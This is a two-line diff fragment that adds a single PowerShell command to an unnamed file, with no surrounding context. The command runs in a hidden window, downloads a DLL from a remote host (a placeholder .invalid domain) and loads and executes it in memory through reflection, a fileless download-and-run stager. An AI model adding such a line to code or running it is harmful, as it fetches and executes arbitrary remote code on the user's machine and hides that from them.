@@ -1,0 +1,2 @@
+powershell -w hidden -c "[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://example.invalid/a.dll')).EntryPoint.Invoke($null,$null)"
+
